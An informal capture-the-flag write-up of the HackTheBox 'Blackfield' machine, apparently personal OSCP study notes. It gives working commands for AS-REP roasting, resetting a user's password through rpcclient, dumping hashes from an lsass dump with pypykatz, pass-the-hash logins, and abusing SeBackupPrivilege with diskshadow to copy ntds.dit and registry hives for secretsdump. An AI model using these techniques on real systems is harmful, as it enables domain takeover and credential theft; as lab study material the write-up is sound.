we do the nmap scan using:


nmap -sC -sV -oA blackfield 10.10.10.192

theres nothing much on the dns bit... it takes time to resolve to us

we get not much info from rpc

we check smb and we find the profiles$ share... it contains usernames which we can get there kerberos ticket... using getnpusers


we get the username as support and password as "#00^BlackKnight"



enum4linux -a -M -l -d -w BLACKFIELD.local -u support -p "#00^BlackKnight" blackfield.htb 2>&1 | tee "/home/isayar17_x401a/OSCP/HTB/OSCP_Labs/blackfield/enum4.txt"

we use enum4linux to check details concerning the authenticated users


using the details we can use bloodhound to get a map of the domain and then using blood hound and checking for First Degree Object Control and we found out we can change the password of the auditor user... but since we do not have a shell we can just use rpcclient to do the change

setuserinfo2 audit2020 23 'isayar17!'(password policy constraints)






we then check rpcclient as we login thorough rpc we see that we have 

SeTrustedCredManAccessPrivilege --->this privs means we can change the password 

make sure to enumerate using bloodhound



we change the password , access the shares with the creds we've made then in the shares after we list recursively we see that we have another user as part of the domain admins... i.e Ipwn3dYourCompany 


then when we access the next share.... i.e memory_analysis we get the lsass.zip which strikes our eye since we know that we can dump hashes from it either using mimikatz or a python linux alternative pypykatz 

we use it and we get the hash belonging to svc_backup and when we test it out for usability using crackmapexec we find out that it can be used for winrm, smb  so we go with winrm firstly

ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -H ldap://10.129.229.17:389  -b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold  --->using this we get the lockout threshold to know if we are constrained

pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes.txt ---->obtain hashes from lsass dump

pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort -u > users.txt --->obtain users from lsass dump


crackmapexec smb 10.129.229.17 -u users.txt -H hashes.txt ---> we use this to check if our command the users and hashes we have got can actually authenticate as winrm or smb


we use winrm

now for priv esc we see that our user has privs as SeBackupPrivilege

from whoami /priv

after checking the user info and domain we see that he is part of the backup operators group...

Backup Operators is a default Windows group that is designed to backup and restore files on the computer using certain methods to read and write all (or most) files on the system.


sooo we can abuse SeBackupPrivilege through utilizing diskshadow to create a new volume and alias it with the C drive so that we are able to read everything on C irregardles of my priviledges... IM doing this as the ntds.dit file which contains the creds might be in use... and thus I cannot copy it using the normal 

SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll


as *** Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns where we can copy a file and be able to read it... but for ntds its different..

now we can copy the files to the current folder we are in 


Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM c:\windows\temp\SYSTEM

Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS

dc= NTDS and SYSTEM 
normalcomputer = system,sam,security files 

If this wasn't a domain controller, there would be no NTDS.dit file to get passwords from, so we
would need to download the SYSTEM, SAM and SECURITY files instead:

Copy-FileSeBackupPrivilege h:\windows\system32\config\SECURITY
c:\windows\temp\SECURITY

Copy-FileSeBackupPrivilege h:\windows\system32\config\SAM c:\windows\temp\SAM

secretsdump.py -ntds ntds -system system LOCAL -->DC


secretsdump.py -security security -sam sam -system system LOCAL -->normal machine

we get the hash belonging to the admin and then we log in




set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
exit






ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -p 389 -h 10.10.10.192 -
b "dc=blackfield,dc=local" -s sub "*" | grep lockoutThreshold ---->check account lockout policy
